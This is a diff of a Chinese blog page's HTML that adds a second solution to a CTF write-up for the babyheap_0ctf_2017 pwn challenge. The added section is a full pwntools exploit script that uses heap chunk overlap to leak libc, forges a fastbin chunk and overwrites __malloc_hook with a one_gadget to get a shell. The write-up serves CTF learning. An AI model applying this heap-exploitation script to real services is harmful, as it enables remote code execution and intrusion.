@@ -454,21 +454,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-01-27
+                    2023-01-29
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.7k
+                    2.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    9 分
                 </div>
                 
 
@@ -487,7 +487,7 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="0x01-buuctf-babyheap-0ctf-2017"><a href="#0x01-buuctf-babyheap-0ctf-2017" class="headerlink" title="0x01 buuctf_babyheap_0ctf_2017"></a>0x01 buuctf_babyheap_0ctf_2017</h1><hr>
-<p>牢骚：第一次做堆题，改exp改了特别长时间，结合别的师傅的wp才做出来的，心累……写篇博客当做里程碑。<br>如果对基础知识不太懂的看看这篇博客，这里不作过多赘述：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43847969/article/details/104897249">知识补充</a></p>
+<p>牢骚：第一次做堆题，改exp改了特别长时间，结合别的师傅的wp才做出来的，心累……写篇博客当做里程碑。<br>如果对基础知识不太懂的看看这篇博客，这里不作过多赘述：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43847969/article/details/104897249">知识补充</a><br>综合网上师傅和<strong>学长大大</strong>的wp，本题提供两种做法</p>
 <hr>
 <p>本题涉及到几个知识点：</p>
 <ul>
@@ -496,10 +496,11 @@
 <li>double free</li>
 <li>堆泄露libc地址</li>
 <li>pwndbg如何快速找到fake chunk</li>
-<li>__malloc_hook函数的利用<br>环境：Ubuntu16.04</li>
+<li>__malloc_hook函数的利用</li>
+<li>堆块重叠<br>环境：Ubuntu16.04</li>
 </ul>
 <hr>
-<h4 id="malloc-hook函数攻击原理："><a href="#malloc-hook函数攻击原理：" class="headerlink" title="__malloc_hook函数攻击原理："></a>__malloc_hook函数攻击原理：</h4><hr>
+<h2 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h2><h4 id="0x01-malloc-hook函数攻击原理："><a href="#0x01-malloc-hook函数攻击原理：" class="headerlink" title="0x01 __malloc_hook函数攻击原理："></a>0x01 __malloc_hook函数攻击原理：</h4><hr>
 <ul>
 <li>像malloc、free、realloc这类函数在执行前会先检查对应的hook函数，如果hook函数为空，则继续执行对应的函数，如果不为空，则跳转到hook中的值对应的地址位置执行。（例如hook函数中如果存的是one_gatget的地址则执行one_gatget）</li>
 </ul>
@@ -636,7 +637,7 @@
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      #<span class="token number">1</span>表示chunk已创建并且有效，后面都会检查
 <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">24LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span> #记录chunk的大小
 <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">24LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>#记录chunk的申请存储地址
-                                                                          #只要free掉三个就会清零，实现用户无法访问chunk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+                                     #只要free掉三个就会清零，实现用户无法访问chunk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>由于本题有保护机制free后无法访问，首先我们的目的是让一处的chunk可以在free掉后还能被访问（这里用到double free），如下操作：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#chunk0 fastbin</span>
 allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#chunk1 fastbin</span>
@@ -731,6 +732,61 @@ payload<span class="token operator">=</span><span class="token string">b'a'</spa
 edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
 allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h2><hr>
+<p>这种方法由学长提供，对<strong>堆块重叠</strong>了解不是很深的看这篇<a target="_blank" rel="noopener" href="https://oneda1sy.gitee.io/2021/11/16/Heap-Overlapping/#:~:text=%E7%AE%80%E5%8D%95%E7%9A%84%E8%AF%B4%E5%B0%B1%E6%98%AF%E6%89%A9%E5%B1%95,%E9%87%8D%E5%8F%A0%E5%AF%B9%E5%BA%94%E7%9A%84%E5%85%B3%E7%B3%BB%E3%80%82">文章</a><br>这里用的是向后合并的方法</p>
+<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><hr>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28791</span><span class="token punctuation">)</span>
+<span class="token comment">#io=process('./babyheap')</span>
+libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
+<span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>  <span class="token comment">#chunk0 这个堆块可以改变大小</span>
+add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>  <span class="token comment">#chunk1 经测试，这个堆块要大于等于后面0x100的堆块大小</span>
+add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>  <span class="token comment">#chunk2 申请大于fastbin范围的堆块用于泄露libc地址指向main_arena+88的位置</span>
+add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>   <span class="token comment">#chunk3 防止topchunk合并，0x60后面申请fake_chunk有用</span>
+free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token comment">#按照向前合并要求将chunk1释放</span>
+payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x108</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x221</span><span class="token punctuation">)</span> <span class="token comment">#修改chunk1的size大小为0x220</span>
+edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span> <span class="token comment">#在chunk0填入</span>
+add<span class="token punctuation">(</span><span class="token number">0x210</span><span class="token punctuation">)</span> <span class="token comment">#将chunk1申请回来，此时chunk2和chunk1的部分堆块重叠  </span>
+payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x108</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x111</span><span class="token punctuation">)</span> <span class="token comment">#用于calloc会将申请得到的堆块chunk1清零，chunk2的size会丢失，将其补上</span>
+edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span> 
+free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">#泄露libc地址</span>
+show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#因为chunk2在chunk1范围，打印chunk1会顺带把chunk2的内容打印出来</span>
+leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'leak:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span> 
+libc_base<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x3c4b78</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'libc_base:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+fake_chunk<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x3c4aed</span>
+add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment">#把chunk2补上</span>
+add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment">#chunk4</span>
+free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment">#free chunk4使用doublefree获取fake_chunk</span>
+payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment">#获得fakechunk</span>
+payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x4526a</span><span class="token punctuation">)</span> <span class="token comment">#覆盖mallok_hook为one_gadget</span>
+edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#再次调用执行malloc_hook </span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
                 
             </div>
             <hr/>
@@ -1250,7 +1306,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">15.2k</span>&nbsp;字
+                class="white-color">15.6k</span>&nbsp;字
             
             
             
